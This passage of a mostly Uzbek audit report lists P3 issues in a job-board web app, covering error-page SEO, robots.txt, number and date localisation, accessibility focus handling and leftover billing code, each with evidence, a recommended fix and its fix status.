- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-093
- **Area:** seo/error
- **Fayl:** `apps/web/src/pages/_error/+Head.tsx:20`
- **Root cause:** +Head va +title faqat VACANCY_NOT_FOUND va COMPANY_NOT_FOUND bo'yicha tarmoqlanadi; is404 va ARTICLE_NOT_FOUND tekshirilmaydi (+Page.tsx'da tekshiriladi). HeadDefault har doim 3 til alternate va x-default chiqaradi.
- **Impact:** 500 javoblarida 'Sahifa topilmadi' title va description, maqola 404'da umumiy sarlavha chiqadi. Xato URL'lari Search Console'da hreflang shovqinini keltiradi. Status kodlarining o'zi to'g'ri.
- **Evidence:** _error/+Head.tsx:12-20 is404/ARTICLE_NOT_FOUND'siz; _error/+title.ts:9-11 `return t.meta.notFound.title`; _error/+Page.tsx:19,39-42 ikkala tarmoq bor; HeadDefault.tsx:52-55 shartsiz alternates.
- **Recommended fix:** +Head va +title'ga ARTICLE_NOT_FOUND va `is404 === false` (t.error.title500) tarmoqlarini qo'shing. HeadDefault'da pageContext.is404 !== undefined bo'lsa alternates va x-default chiqarmang.
- **Severity izohi:** P3 saqlandi (ISSUE-093 NOT FIXED).
- **Manba topilmalar:** seo-12
- **Bajarilgan fix:** seo-12: FIXED — _error/+Head.tsx and +title.ts now branch on 503, ARTICLE_NOT_FOUND and is404===false (500) instead of always saying 'page not found'; HeadDefault already suppresses hreflang/x-def
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-092

**robots.txt hisob sahifalarini ham Disallow, ham noindex qiladi; parametrli crawl tuzoqlari uchun qoida yo'q**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-092
- **Area:** seo/robots
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:28`
- **Root cause:** PRIVATE_PATHS (/login, /signup, /profile, /favorites...) Disallow qilingan, o'sha sahifalarda noindex ham bor, lekin bloklangan crawler noindex'ni ko'rmaydi. /vacancies va /companies filtr kombinatsiyalari (q, page, saved=1) cheklanmagan.
- **Impact:** Tashqi havolali hisob URL'lari 'Indexed, though blocked by robots.txt' bo'lib qolishi mumkin. Katta katalogda facet va sahifa permutatsiyalari crawl budjetini yeydi. Ta'sir kichik.
- **Evidence:** seo.routes.ts:28-41 PRIVATE_PATHS, :47-51 3 tilda Disallow; login/+Head.tsx:12 va signup/+Head.tsx:12 noindex; `Disallow: /*?*saved=` kabi qoida yo'q. ISSUE-092 FIXED (o'lik yo'llar olib tashlangan), Disallow+noindex ikkiligi qolgan.
- **Recommended fix:** Hisob sahifalarini Disallow'dan chiqarib, noindex'ga tayaning; /admin va /api uchun Disallow qolsin. `Disallow: /*?*saved=` kabi aniq qoidalar qo'shing, q va facet kombinatsiyalari uchun canonical/noindex fix'iga tayaning.
- **Severity izohi:** P3 saqlandi. ISSUE-092 FIXED deb belgilangan, lekin Disallow+noindex qismi hali bor.
- **Manba topilmalar:** seo-13
- **Bajarilgan fix:** seo-13: PARTIAL — Deliberately kept the Disallow list for private paths (all of them already emit noindex, so the duality remains) and instead added the crawl-trap rule `Disallow: /*?*saved=` and `D
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-080

**/pricing sahifasi, billing client API/tiplari va pricing i18n kalitlari o'lik kod bo'lib qolgan; doimiy bepul platformada vaqtinchalik 302 va zid narxlar**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-080
- **Area:** monetization/cleanup-web
- **Fayl:** `apps/web/src/pages/pricing/+guard.ts:11`
- **Root cause:** Guard doim /employer'ga 302 qiladi va izohida monetizatsiyani 'keyin' deydi. Natijada +Page (checkout, Payme/Click, to'lov tarixi), +data (fetchPlans), indekslanadigan +Head va +title, apiExtra/types billing kodi hamda pricing/pricingExtra/footer/open/meta/support 'payments' kalitlari hech qachon ishlamaydi.
- **Impact:** Google /pricing (va /ru, /en) ni 302 uchun indeksda saqlaydi. i18n katalogi ('Biznes' 499 000, '1 ta faol vakansiya') DEFAULT_PLANS ('Standart' 490 000) va bepul qoidaga zid, noto'g'ri haqiqat manbai. Guard o'chirilsa, checkout UI darhol ochiladi.
- **Evidence:** pricing/+guard.ts:11 `throw redirect(localizeHref("/employer", ...), 302)`; pages/pricing'da +Head.tsx (noindex'siz), +Page.tsx, +data.ts, +title.ts; apiExtra.ts:287-316, types.ts:471-521; messages.uz.ts:575 `499 000 so'm` vs billing.service.ts:32 490_000; admin/payments/+Page.tsx:59-62 pricingExtra.status* ga tayanadi.
- **Recommended fix:** Faqat +guard.ts'ni qoldiring va 301 (yoki 410) qiling. Qolgan pricing sahifa fayllari, billing fetcher'lari va tiplarini o'chiring. To'lov status yorliqlarini admin.payments'ga ko'chiring. uz/ru/en va types'dan pricing, pricingExtra, footer.employersPricing, open.pricing, meta.pricing va support 'payments' kalitlarini olib tashlang.
- **Severity izohi:** P3 saqlandi. Ikki xom topilma bitta /pricing qoldig'i ildiziga birlashtirildi; ISSUE-080 PARTIAL.
- **Manba topilmalar:** seo-14, monetization-5
- **Bajarilgan fix:** seo-14: FIXED — pricing/+guard.ts now throws redirect(localizeHref('/employer', locale), 301) with a comment citing D-040. Deleting the unreachable +Head/+data files is monetization-5 (not owned). | monetization-5: NOT FIXED — Out of owned scope: only pricing/+guard.ts is mine. pricing/+Page.tsx, +Head.tsx, +data.ts, the billing fetchers/types in lib/apiExtra.ts + lib/types.ts and the pricing i18n keys a
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-072

**JobPosting eski employmentType 'remote' uchun FULL_TIME to'qiydi va doim directApply: true deydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-072
- **Area:** seo/jsonld
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+Head.tsx:13`
- **Root cause:** EMPLOYMENT_SCHEMA eski 'remote' qiymatini (bu bandlik turi emas, ish joyi) ma'lumotda yo'q FULL_TIME'ga map qiladi. directApply: true qattiq yozilgan, lekin ariza login va telefon tasdig'ini talab qiladi.
- **Impact:** Google Jobs bandlik turi noma'lum vakansiyada 'Full-time' ko'rsatishi mumkin, bu 'ma'lumot to'qimang' qoidasiga zid. directApply noto'g'ri deb baholanishi mumkin. Ta'sir kichik.
- **Evidence:** +Head.tsx:10-15 `remote: "FULL_TIME"`; :60 employmentType map; :65 `directApply: true`; ApplyCard.tsx:142 PhoneGateNotice; ISSUE-072 root cause (4) aynan shu mapping.
- **Recommended fix:** employment 'remote' bo'lsa employmentType'ni chiqarmang (joylashuv workplaceType va TELECOMMUTE bilan berilgan). directApply'ni faqat ariza sahifada haqiqatan yakunlansa qo'ying yoki xususiyatni olib tashlang.
- **Severity izohi:** P3 saqlandi. ISSUE-072 PARTIAL, bu band tuzatilmagan.
- **Manba topilmalar:** seo-15
- **Bajarilgan fix:** seo-15: FIXED — EMPLOYMENT_SCHEMA no longer maps the legacy workplace value 'remote' to FULL_TIME and unknown values are omitted rather than turned into OTHER (remoteness is already expressed by j
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-091

**Raqamlar har tilda ru-RU formatida (EN'da '1 207', '12 000 000 UZS')**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-091
- **Area:** i18n/format
- **Fayl:** `apps/web/src/lib/format.ts:3`
- **Root cause:** formatNumber va formatSalary uchun modul darajasidagi bitta Intl.NumberFormat('ru-RU') ishlatiladi; types.ts'dagi grp() ham shunday va messages.en.ts'da 16 marta chaqiriladi. ru-RU uz ICU hydration mismatch'idan qochish uchun tanlangan, lekin EN'ga ham qo'llangan.
- **Impact:** Ingliz sahifalarida '1,207' o'rniga '1 207 jobs' chiqadi. Ba'zi EN matnlarda vergul qo'lda yozilgan, format nomuvofiq. Faqat kosmetik.
- **Evidence:** lib/format.ts:3 `const numberFmt = new Intl.NumberFormat("ru-RU")`; types.ts:2397 grp ru-RU; CountUp.tsx:39; employer/candidates/+Page.tsx:416; api common/format.ts:3; lib/salaries/format.ts:7-13 en uchun allaqachon en-US ishlatadi.
- **Recommended fix:** formatNumber, formatSalary va grp'ga locale uzating: en uchun en-US, uz/ru uchun ru-RU (ikkalasi ICU'da barqaror). CountUp va candidates sahifasidagi inline Intl chaqiruvlarini almashtiring.
- **Severity izohi:** P3 saqlandi (ISSUE-091 R227, NOT FIXED).
- **Manba topilmalar:** i18n-6
- **Bajarilgan fix:** i18n-6: PARTIAL — formatNumber/formatSalary accept a locale (en -> en-US grouping) with the old ru-RU behaviour kept when it is omitted, and every owned call site passes it (vacancy cards, vacancy d
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-091

**Sana va vaqt formati nomuvofiq: locale'siz toLocaleDateString(), chatda brauzer timezone'i va en-GB**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-091
- **Area:** i18n/format
- **Fayl:** `apps/web/src/pages/alerts/+Page.tsx:134`
- **Root cause:** Alohida Date chaqiruvlari Asia/Tashkent va en-US'ni qat'iy qiladigan umumiy formatDate(iso, locale)'dan o'tmaydi. Chat helper'lari mahalliy vaqt bo'yicha kun chegarasi va boshqa EN tegidan foydalanadi.
- **Impact:** /alerts'dagi 'oxirgi tekshiruv' va admin jadval sanalari sahifa tiliga emas, OS tiliga ergashadi (RU sahifada '9/15/2026' chiqishi mumkin). UTC+5 dan tashqaridagi foydalanuvchida chat kun ajratgichlari boshqa sanalar bilan mos kelmaydi.
- **Evidence:** alerts/+Page.tsx:134 `new Date(item.lastNotifiedAt).toLocaleDateString()`; admin/users/+Page.tsx:142, admin/reviews/+Page.tsx:135, admin/companies/+Page.tsx:125 argumentsiz; lib/messages/format.ts:6 TIME_TAG en-GB, :9-21 local startOfDay/dayKey; lib/format.ts:30-32 en-US va Asia/Tashkent.
- **Recommended fix:** Alerts va admin sahifalarida formatDate(iso, locale) ishlating. Chat uchun bitta siyosat tanlang: formatClock/dayKey/formatDayLabel'da Asia/Tashkent yoki brauzer vaqtini hujjatlashtirish. EN tegini birxillashtiring.
- **Severity izohi:** P3 saqlandi (ISSUE-091 R231/R232, NOT FIXED).
- **Manba topilmalar:** i18n-7
- **Bajarilgan fix:** i18n-7: PARTIAL — /alerts 'last checked' now uses formatDate(iso, locale). NOT done: the four admin tables still call toLocaleDateString() with no arguments, and the chat time policy (lib/messages/f
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-091

**Til almashtirgich xato sahifalarida yo'lni yo'qotadi; locale cookie helper'lari o'lik kod**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-091
- **Area:** i18n/routing
- **Fayl:** `apps/web/src/components/LanguageSwitcher.tsx:19`
- **Root cause:** Switcher pageContext.localePathname'ni to'g'ridan-to'g'ri o'qiydi, render(404) xato sahifalarida esa bu maydon yo'q (pageLocale() buni hal qiladi). resolveLocale va persistLocale hech qayerda import qilinmaydi.
- **Impact:** /ru/vacancies/eski-slug (404) sahifasida til almashtirilsa /en/vacancies/eski-slug o'rniga /en ga o'tadi. Qaytgan RU tashrifchi / ga tushsa, afzal ko'rgan tili eslab qolinmagan va o'zbekcha ochiladi.
- **Evidence:** LanguageSwitcher.tsx:19 `const logical = (pageContext.localePathname as string) || "/"`; pageLocale.ts URL fallback'iga ega; config.ts'dagi resolveLocale va persistLocale'ning web/src, server, api'da chaqiruvchisi yo'q (grep bo'sh).
- **Recommended fix:** Switcher'da pageLocale(pageContext).pathname ishlating. Cookie helper'larini o'chiring yoki til almashtirishda persistLocale chaqirib, saqlangan tilni / da faqat maslahat sifatida ishlating (crawler'larni avtomatik redirect qilmang).
- **Severity izohi:** P3 saqlandi (ISSUE-091 R225/R228, NOT FIXED).
- **Manba topilmalar:** i18n-11
- **Bajarilgan fix:** i18n-11: PARTIAL — The path loss is fixed: LanguageSwitcher uses pageLocale(pageContext).pathname, so switching language on a render(404) page keeps /vacancies/old-slug. The dead resolveLocale/persis
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-091

**O'zbekcha qo'shimchalar ajratib yoziladi ('so'm dan') va lug'atlarda terminologiya nomuvofiq**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-091
- **Area:** i18n/terminology
- **Fayl:** `apps/web/src/lib/i18n/messages.uz.ts:807`
- **Root cause:** Qo'shimchalar bo'shliqdan keyin ulanadi va asosiy atamalar uchun glossariy yo'q; har lug'at bo'limi o'z sinonimlaridan foydalanadi.
- **Impact:** UZ maoshda 'so'mdan' o'rniga '5 000 000 so'm dan' chiqadi. Bir tushuncha sahifadan sahifaga turli nom oladi va nomzod hamda ish beruvchi uchun aniqlik pasayadi.
- **Evidence:** messages.uz.ts:807-808 `${v} so'm dan` / `${v} so'm gacha`; api common/format.ts:6-7 `${cur} dan`/`${cur} gacha`; uz 'ariza' 144 va 'murojaat' 13, 'nomzod' 49 va 'ish izlovchi' 11; en 'candidate' 55 / 'job seeker' 11 / 'applicant' 3.
- **Recommended fix:** Web va API'da so'mdan / so'mgacha deb tuzating. DESIGN.md'ga qisqa glossariy qo'shing (uz ariza/nomzod/vakansiya, ru отклик/кандидат/вакансия, en application/candidate/job) va chetga chiqqan satrlarni moslang.
- **Severity izohi:** P3 saqlandi (ISSUE-091 R229/R230, NOT FIXED).
- **Manba topilmalar:** i18n-12
- **Bajarilgan fix:** i18n-12: PARTIAL — Web side fixed: messages.uz.ts salaryFrom/salaryTo now produce 'so'mdan'/'so'mgacha'. apps/api/src/common/format.ts has the same bug and the DESIGN.md glossary is not owned by this
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Skip link yo'q, asosiy nav yorliqsiz, sticky panellar fokusni yashiradi, nomzod profilida ikkita h1**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-075
- **Area:** a11y/navigation-structure
- **Fayl:** `apps/web/src/components/Layout.tsx:24`
- **Root cause:** Layout'da bypass mexanizmi va sticky header uchun global scroll-padding yo'q. Kontent komponentlari h1'ni qattiq yozadi, ProfileHeader esa allaqachon h1 chiqaradi.
- **Impact:** Klaviatura foydalanuvchisi har sahifada logo, nav havolalari, qo'ng'iroq va hisob tugmalaridan Tab bilan o'tadi (WCAG 2.4.1). Yorliqsiz nav landmark'larini farqlab bo'lmaydi. Fokuslangan element sticky panellar ostiga tushishi mumkin (2.4.11). Profil sahifasi tuzilishi xiralashadi.
- **Evidence:** Layout.tsx:23-24 `<Header />` va `<main className="flex-1">` skip link va id'siz; Header.tsx:143 va :292 <nav> aria-label'siz; Footer.tsx:140 aria-label="Footer" inglizcha; ProfileNav.tsx:121 sticky top-[78px]; ProfileHeader.tsx:63 h1, ProfileOverview.tsx:47 va ResumeWizard.tsx:69 ikkinchi h1.
- **Recommended fix:** Layout boshiga #main'ga focus-visible skip link qo'shing, main'ga tabIndex=-1 bering. html scroll-padding-top ~5.5rem (/profile'da ko'proq). Asosiy nav'larga i18n yorliq bering va footer yorlig'ini tarjima qiling. Profil kontent sarlavhalarini h2 qiling.
- **Severity izohi:** P3 saqlandi. ISSUE-075 PARTIAL (R247): skip link hali yo'q.
- **Manba topilmalar:** a11y-ui-9
- **Bajarilgan fix:** a11y-ui-9: PARTIAL — Skip link added as the first focusable element in Layout with <main id="main-content" tabIndex={-1}>; both primary <nav> landmarks are labelled with the existing t.nav.menu key; ht
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Utility'lar global fokus halqasini bekor qilgan joylarda fokus indikatori sust yoki yo'q; qidiruv inputlari yorliqsiz**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-075
- **Area:** a11y/focus
- **Fayl:** `apps/web/src/components/SearchBar.tsx:24`
- **Root cause:** focus:outline-none (specificity 0,2,0) global :focus-visible outline'dan kuchli, o'rniga qo'yilgan uslublar esa juda xira. Select'dagi naqshning o'zi, lekin boshqa komponentlarda.
- **Impact:** Klaviatura foydalanuvchisi bosh sahifadagi asosiy qidiruvda va kebab menyularda fokusni yo'qotadi. Qidiruv inputlari faqat placeholder bilan aniqlanadi.
- **Evidence:** SearchBar.tsx:24 faqat `focus-within:border-ink/25` (1.43:1 o'zgarish), :31 input label/aria-label'siz; AdminShell.tsx:216 ham shunday; ActionsMenu.tsx:56 `focus:bg-surface-2` (1.11:1); ArticleCard.tsx:41 link outline'i olib tashlangan, :22 ring signal/50 (2.24:1); PhoneInput.tsx:29-31 invalid holatda doimiy border-signal.
- **Recommended fix:** VacancySearch.tsx:92 naqshini ishlating (focus-within:border-signal + ring-4 ring-signal/10). SearchBar va AdminShell qidiruviga sr-only label qo'shing. Menyu elementlariga focus-visible bg-signal-soft va inset ring, ArticleCard'ga shaffof bo'lmagan ring-signal bering. PhoneInput invalid holatini border-danger bilan ko'rsatib, fokus halqasini saqlang.
- **Severity izohi:** P3 saqlandi. ISSUE-075 PARTIAL (R162/R248).
- **Manba topilmalar:** a11y-ui-10
- **Bajarilgan fix:** a11y-ui-10: PARTIAL — Fixed in the owned files: the home SearchBar gets sr-only labels for the query input and the region Select plus role=search and the border-signal + ring-4 focus indicator; the comp
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-081

**Tungi rejim va responsive mayda kamchiliklar: global color-scheme yo'q, 100vh, illyustratsiyalarning tungi varianti yo'q, nowrap va uzun sarlavhalar**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-081
- **Area:** responsive/dark-mode
- **Fayl:** `apps/web/src/components/profile/ExperienceList.tsx:304`
- **Root cause:** Tungi rejim faqat token klasslari bilan beriladi. Native brauzer widget'lari color-scheme'ga muhtoj, u esa global emas, har bir kontrolga alohida qo'shilgan.
- **Impact:** Tungi rejimda rezyume oy tanlagichlari va admin select'lar och popup va qorong'i fonda qorong'i ikonkalar ko'rsatadi. Mobil brauzer va tor ustunlarda mayda layout kamchiliklari.
- **Evidence:** color-scheme faqat FormControls.tsx:126 va FieldSelect.tsx:51 da; yo'q: ExperienceList.tsx:304,317 (type=month), AdminShell.tsx:242, admin/+Page.tsx:276; 100vh: vacancies/+Page.tsx:134, companies/+Page.tsx:119, VacancyForm.tsx:544; SidebarCards.tsx:37 whitespace-nowrap; VacancyCard.tsx:57-62 break-words'siz (taxmin).
- **Recommended fix:** color-scheme'ni global o'rnating (':root{color-scheme:light} .dark{color-scheme:dark}') va scrollbar-color qo'shing, keyin per-control hack'lar olib tashlanadi. 100dvh ishlating. whitespace-nowrap o'rniga min-w-0 va break-words, karta sarlavhalariga [overflow-wrap:anywhere]. Tungi illyustratsiya variantlari yoki dark:opacity bering.
- **Severity izohi:** P3 saqlandi (ISSUE-081 NOT FIXED).
- **Manba topilmalar:** a11y-ui-11
- **Bajarilgan fix:** a11y-ui-11: PARTIAL — Fixed in the owned files: both type=month inputs in the experience editor declare color-scheme so the native picker follows dark mode, and the vacancy card title gets [overflow-wra
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Filtr drawer'lari modal fokus tuzog'ini nusxalagan va useDialog'dan farqlanib ketgan**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-075
- **Area:** maintainability/a11y
- **Fayl:** `apps/web/src/components/companies/CompanyFilterDrawer.tsx:46`
- **Root cause:** Ikkala drawer useDialog paydo bo'lishidan oldin yozilgan va unga ko'chirilmagan.
- **Impact:** Hozircha ta'siri kichik, chunki yopish tugmasi doim fokuslanadi. Lekin bir tuzoqqa kiritilgan tuzatish qolgan ikkitasiga yetmaydi va modal xatti-harakati allaqachon nomuvofiq.
- **Evidence:** CompanyFilterDrawer.tsx:7,46-85 va VacancyFilterDrawer.tsx:7,185-223 useDialog mantiqini farqlar bilan nusxalaydi: FOCUSABLE oddiy 'select' (useDialog.ts:4 select:not([disabled])), fokuslanadigan element bo'lmasa Tab modaldan chiqadi (useDialog.ts:40-42 preventDefault qiladi), preventScroll'siz fokus qaytaradi, panelda tabIndex=-1 yo'q.
- **Recommended fix:** Ikkala effektni useDialog(open, panelRef, onClose) bilan almashtiring, matchMedia yopish listener'ini saqlang va panellarga tabIndex={-1} qo'shing.
- **Severity izohi:** P3 saqlandi. ISSUE-075 PARTIAL (R249).
- **Manba topilmalar:** a11y-ui-12
- **Bajarilgan fix:** a11y-ui-12: FIXED — Both filter drawers now use the shared useDialog (disabled selects excluded from the loop, Tab prevented when nothing is focusable, focus restored with preventScroll) and their pan
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-080

**Demo seed bepul platformaga moslanmagan: HR'ga 'Premium tarif faollashtirildi' bildirishnomasi, pullik rejalar, obunalar va 11 ta to'lov**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Mavjud tracker:** ISSUE-080
- **Area:** monetization/demo-data
- **Fayl:** `apps/api/src/prisma/demo-seed.ts:1296`
- **Root cause:** createDemo() BILLING_ENABLED'dan qat'i nazar ensurePlans() chaqiradi, kompaniyalarga premium/standard obuna biriktiradi va to'lovlar yaratadi. NOTIFICATIONS'da HR uchun bepul platformadan oldingi Premium matni va /pricing havolasi qolgan. D-028 seed'ni ataylab o'zgartirmagan.
- **Impact:** hr@demo.ish.top bildirishnomalari 'vakansiya 100 ta bilan cheklangan, nomzodlar bazasi Premium'da' deydi, bu bepul va limitsiz qoidaga zid. Admin demo'da 'Tushum', Premium/Standart ustuni va tasdiqlanadigan pending to'lovni ko'radi. Production'ga ta'sir qilmaydi.
- **Evidence:** demo-seed.ts:1296 `["hr", "system", "Premium tarif faollashtirildi", "Obuna 30 kunga faol: 100 tagacha vakansiya va nomzodlar bazasi ochiq.", "/pricing", ...]`; :1299-1300 admin 'To'lov kutilmoqda'; :1620 `await ensurePlans()`; :1672-1673 subscriptionPlanId/ExpiresAt; :1821-1834 payments (pending, failed); :1927 '(NextBrain, Premium)'; :2049 prod'da --force'siz ishlamaydi.
- **Recommended fix:** HR qatorini bepul platformaga mos xabar bilan (masalan kompaniya tasdiqlandi -> /employer) almashtiring yoki o'chiring. Reja, obuna va to'lov seed'ini olib tashlang yoki features.billing ichiga oling, admin to'lov bildirishnomalarini va console'dagi 'Premium'ni o'chiring. Reset cleanup'ni saqlang va db:demo'ni --for bilan qayta ishga tushiring.
- **Severity izohi:** monetization-1 P2 -> P3: faqat demo/dev bazasi, production'ga ta'sir yo'q. Ikki xom topilma bitta seed ildiziga birlashtirildi.
- **Manba topilmalar:** monetization-1, monetization-2
- **Bajarilgan fix:** monetization-1: WONT FIX — Demo ma'lumot o'zgartirilmaydi (brief qoidasi); owner qayta seed qilishi kerak | monetization-2: WONT FIX — Demo seed billing ma'lumoti — demo ma'lumot qoidasi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-080

**Admin to'lovni tasdiqlash va billing admin UI BILLING_ENABLED bilan yopilmagan; tasdiqlash ish beruvchiga 'tarif faollashtirildi' deydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-080
- **Area:** monetization/admin-legacy
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:502`
- **Root cause:** adminRoutes shartsiz ro'yxatdan o'tgan: /api/admin/payments va POST .../confirm features.billing'ni tekshirmasdan markPaymentPaid chaqiradi. Overview doim to'lovlarni jamlaydi, web esa doim 'To'lovlar' nav'i, 'Tushum' kartasi va 'Tarif' ustunini ko'rsatadi.
- **Impact:** Monetizatsiya o'chiq bo'lsa ham admin eski pending to'lovni tasdiqlay oladi: kompaniyaga subscriptionPlanId yoziladi (hech narsa ochilmaydi) va ish beruvchiga bepul platformada '"Standart" tarifi faollashtirildi' xabari boradi. Adminlar mavjud bo'lmagan funksiya uchun daromad UI'ni ko'radi.
- **Evidence:** admin.routes.ts:502 `app.post("/api/admin/payments/:transactionId/confirm", adminOnly` -> markPaymentPaid, notify 'To'lov tasdiqlandi', body `"${payment.plan.name}" tarifi faollashtirildi.`; server.ts:253 billing bayroq ortida, :254 adminRoutes shartsiz; AdminShell.tsx:50 `/admin/payments`; admin/+Page.tsx:107-112 Tushum.
- **Recommended fix:** !features.billing bo'lsa confirm 404/409 qaytarsin yoki to'lov admin route'lari faqat bayroq bilan ro'yxatdan o'tsin. /api/admin/overview'ga billing bayrog'ini qo'shib, u o'chiq bo'lsa daromad kartasi, tarif ustuni va nav elementini yashiring. Kerak bo'lsa faqat o'qiladigan eski ro'yxat qolsin.
- **Severity izohi:** P3 saqlandi: faqat admin, ISSUE-080 PARTIAL (R236).
- **Manba topilmalar:** monetization-3
- **Bajarilgan fix:** monetization-3: FIXED — POST /api/admin/payments/:transactionId/confirm returns 404 when BILLING_ENABLED is false (before markPaymentPaid, so no notification is sent); overview exposes billingEnabled and 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-080

**Nomzod qidiruvidagi 'Premium' belgisi, 'faqat premium vakansiyalar' filtri va premium-first sukut saralashi pullik darajani eslatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-080
- **Area:** monetization/naming
- **Fayl:** `apps/web/src/components/vacancies/VacancyFilters.tsx:242`
- **Root cause:** Vacancy.isPremium'ni faqat admin o'rnatadi (employer sxemasi qabul qilmaydi), lekin ommaviy UI uni 'Premium' deb belgilaydi, alohida filtr va chip beradi va sukut saralash isPremium'ni birinchi qo'yadi.
- **Impact:** Bepul platformaning asosiy ish qidiruvida Premium daraja va faqat-premium filtri ko'rinadi, bu ish beruvchilar ko'rinish uchun pul to'laydi degan taassurot beradi. To'lov yo'li yo'q, ta'sir faqat taassurot va izchillikda.
- **Evidence:** VacancyFilters.tsx:242 `<Switch checked={value.premium} ...>{f.premium}</Switch>`; vacancies/VacancyCard.tsx:64-68 premium belgisi; messages.uz.ts:1103 'Faqat premium vakansiyalar'; vacancies.service.ts:276-277 `DATE_ORDER = [{ isPremium: "desc" }, { publishedAt: "desc" }]`; FINAL_AUDIT.md:271 faqat nomlashni qayd etgan.
- **Recommended fix:** Admin tavsiyasini qoldirib, neytral nom bering (uz 'Tavsiya etiladi', ru 'Рекомендуем', en 'Featured'). Ommaviy premium-only filtri va chipni olib tashlashni ko'rib chiqing. Orqaga moslik uchun premium URL/API parametri qolsin, DESIGN.md'ni yangilang.
- **Severity izohi:** P3 saqlandi, ishonch o'rtacha. ISSUE-080 isPremium'ni admin qo'lda qo'ygani uchun qoidaga mos deb hisoblagan; qolgani nomlash masalasi.
- **Manba topilmalar:** monetization-4
- **Bajarilgan fix:** monetization-4: FIXED — D-065 requires the public 'Premium' label to become neutral (uz 'Tavsiya etiladi', ru 'Rekomenduem', en 'Featured') while the API/URL parameter stays `premium`. The label is only e
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-064

**Billing modulini qayta yoqish xavfli: rejalar vakansiya limiti va pullik nomzod qidiruvini kodlaydi, webhook har imzolangan chaqiruvni to'langan deb belgilaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Mavjud tracker:** ISSUE-064
- **Area:** monetization/legacy-backend
- **Fayl:** `apps/api/src/modules/billing/billing.service.ts:17`
- **Root cause:** DEFAULT_PLANS bepul rejada maxActiveVacancies 3 va canSearchCandidates false saqlaydi. assertCanSearchCandidates chaqiruvchisiz qolgan va 402 tashlaydi. Webhook Payme metodi va summasini tekshirmasdan markPaymentPaid qiladi, taqqoslash timing-safe emas, createCheckout cheksiz pending yaratadi.
